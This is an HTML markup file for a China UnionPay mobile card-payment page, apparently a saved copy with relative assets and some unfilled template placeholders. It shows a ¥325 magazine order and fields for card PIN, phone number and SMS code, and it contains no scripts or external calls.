<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>中国银联</title>
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport"
        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0">
    <link rel="shortcut icon" href="./favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./phone_new.css">
</head>

<body>


    <div class="content">

        <div class="header">
            <div class="do-return" data-ref="" data-locked="false"></div>
            <span class="s_language" id="s_language">中文</span>
            <div class="echo_language" id="echo_language" style="display: none">
                <div class="triangle-up"></div>
                <ul class="echo_language_ul" id="echo_language_ul">
                    <li class="language_action" id="lang-zh_CN">中文</li>
                    <li id="lang-en_US" class="">English</li>
                </ul>

                <div style="clear: both"></div>
            </div>


            <p class="dn title_android" id="title_tips" style="display: block;">银行卡付款</p>
            <p class="paytimeout_tips" id="paytimeout_tips" style="display: none;"></p>
        </div>
        <div class="gray-solid-line grey"></div>
        <div id="preAuth" class=""></div>


        <div id="upopNoticeInfo">

        </div>

        <div class="pos_notify dn" id="pos_notify">
            <span>●</span>
            <div id="upgg_location-215" data-upgg-state="1" class=" upgg_container"
                style="background: url(&quot;./loading.gif&quot;) center center no-repeat transparent;"></div>
        </div>

        <div class="container">

            <div class="order-list-wrapper">

                <div class="order-list-block">
                    <div class="order-list" id="orderList">
                        <p class="order-item-pay-amount">¥<span id="order-item-pay-amount">325.00</span></p>
                        <p class="order-item-origin-amount" style="display: none;">¥<span
                                id="order-item-origin-amount">325.00</span></p>
                        <p class="order-item"><label>商户名称</label><span>成都邮征天下信息技术有限公司（杂志铺）</span></p>
                        <p class="order-item fold hide"><label>交易时间</label><span>2021-05-26</span></p>
                        <p class="order-item fold hide"><label>订单编号</label><span>2021526163640023935</span></p>
                        <div class="btn-show-order-dash grey fold hide"></div>
                    </div>
                    <!--下拉-->
                    <div class="order-list-block-xl hide" id="order-list-block-show"></div>
                </div>
                <div class="order-status hide">
                    <p></p>
                </div>
                <!--<p class="">点击查看所有订单信息</p>-->
            </div>
            <div class="promotion-list" id="new_promotion" style="display: none;">
            </div>
            <div class="paycard-list" id="new_paycard" style="">
                <div class="new-select-wrapper select-wrapper-cardList"> <span class="paycard-title">付款方式</span>
                    <div class="paycard-content" id="select-bankcard-id" data-ref-bid="${displayCardInfo.bindId}">
                        <div class="inline select-bank-name" id="select-bank-name">中国邮 ... 银行</div>
                        <div class="select-bank-type inline" id="select-bank-type">储蓄卡</div>
                        <div class="select-bank-suffix inline" id="select-bank-suffix">[7268]</div>
                        <div class="select-area-new inline "><img src="./arrow_right.png"></div>
                    </div>
                </div>
            </div>
            <div class="new_yellow_msg dn" id="yellow-msg" style="display: none;"><span></span></div>
            <div class="new_error_msg dn" id="error-msg" style="display: none;"><span></span></div>
            <div class="instalment-list" id="new_instalment" style=""></div>
        </div>



        <!--<p class="">点击查看所有订单信息</p>-->
    </div>
    <div id="slider-wrapper" style="height: 282px;">
        <div class="overflow-wrapper" id="overflow-wrapper" style="margin-left: 0%;">
            <div class="main-container slide" id="main-container">
                <div class="form-container">
                    <div id="discount-content-area" class="dn">${discountHTML}</div>
                    <div class="label-input">
                        <div class="new_yellow_msg dn" id="yellow-msg"><span></span></div>
                        <div class="new_error_msg dn" id="error-msg"><span></span></div>
                        <div class="cardIndex-inner-label-input">
                            <div class="inner-label-input item-password" data-ref="encpassword">
                                <div class="input-wrapper"> <span class="inner-label ">密码</span>
                                    <div type="password" id="password" class="up-password password w6 backfontcolor">
                                        银行卡取款密码</div> <i class="op del hide"><img src="./input_delete.png"></i>
                                </div>
                            </div>
                            <div class="gray-solid-line-98 grey"></div>
                            <div class="inner-label-input item-mobile " data-ref="mobile">
                                <div class="input-wrapper"> <span class="inner-label ">手机号</span><input id="phoneNumber"
                                        type="tel" maxlength="11" class="up-input mobile w90 " style="width:60%"
                                        placeholder="银行预留手机号" value=""> <i class="op del hide"><img
                                            src="./input_delete.png"></i> </div>
                            </div>
                            <div class="gray-solid-line-98 grey"></div>
                            <div class="inner-label-input item-smsCode " data-ref="smsCode">
                                <div class="input-wrapper" style="width:60%"> <span
                                        class="inner-label ">验证码</span><input type="tel" maxlength="6"
                                        class="up-input sms w90 " placeholder="短信验证码" style="width:30%"> <i
                                        class="op del hide" style="right: 123px"><img src="./input_delete.png"></i>
                                </div> <span class="separator">|</span>
                                <div id="sendCode" class="up-btn sms"> <a>获取验证码</a> </div>
                            </div>
                            <div class="gray-solid-line-98 grey"></div>
                        </div>
                        <div class="agreement-wrapper"> <span
                                style="background:url(./boxRedUnchecked.png) no-repeat; background-size: contain;"></span>
                            <span class="hide"
                                style="background:url(./boxRedChecked.png) no-repeat; background-size: contain;"></span>
                            <p>接受 <a id="userAgreement">银联用户相关服务协议</a> </p>
                        </div>
                        <div class="agreement-wrapper-rememberCard agreed"> <span class="hide unchecked"
                                style="background:url(./boxRedUnchecked.png) no-repeat; background-size: contain;"></span>
                            <span class="checked"
                                style="background:url(./boxRedChecked.png) no-repeat; background-size: contain;"></span>
                            <p>记住卡号，下次支付免输入 </p>
                        </div>
                        <div class="btn-wrapper">
                            <div class="up-btn next disable"> <a>确认付款</a> </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>




    <div class="loading-block hide">
        <div class="overlay"></div>
        <p>
            <img class="logobg" src="./load_logo.gif">
        </p>
    </div>


    <div class="inner-label-keyboard">
        <div id="keybord" style="display:none" class="keyboard-container container">
            <div class="keyboard-container-inner">

                <div class="keyboard-title"><img src="./key_title.png"></div>

                <div class="keyboard-row" id="keyboard-row1">
                    <div class="keyboard-div1 head-clear"></div>
                    <div class="keyboard-div2 head-clear"></div>
                    <div class="keyboard-div3 head-clear"></div>
                    <div style="clear: both"></div>
                </div>


                <div class="keyboard-row" id="keyboard-row2">
                    <div class="keyboard-div1"></div>
                    <div class="keyboard-div2"></div>
                    <div class="keyboard-div3"></div>
                    <div style="clear: both"></div>
                </div>

                <div class="keyboard-row" id="keyboard-row3">
                    <div class="keyboard-div1"></div>
                    <div class="keyboard-div2"></div>
                    <div class="keyboard-div3"></div>
                    <div style="clear: both"></div>
                </div>

                <div class="keyboard-row" id="keyboard-row4">
                    <div class="keyboard-cp"></div>
                    <div class="keyboard-div2"></div>
                    <div class="keyboard-bk div-clear"></div>
                    <div style="clear: both"></div>
                </div>
            </div>

        </div>
    </div>






    <div class="contentPop" id="contentPop"></div>
    <div class="popInfo" id="popInfo"></div>
    <div id="select_wrapper"></div>
    <div class="logo-bottom"></div>




    <p class="toast hide"></p>
    <div class="popup-block  hide" style="z-index:30000">
        <div class="confirm-block">
            <p class="hintTitle">提示</p>
            <p class="hint"> 您输入的是借记卡，为了您的帐户安全，请下载银联支付控件。并在成功安装后，重新点击“下一步” </p>
            <div class="btn-group">
                <div class="up-btn popup-left fl"> <a>换卡支付</a> </div>
                <div class="up-btn popup-right fl"> <a>确定</a> </div>
            </div>
        </div>
    </div>
</body>

</html>
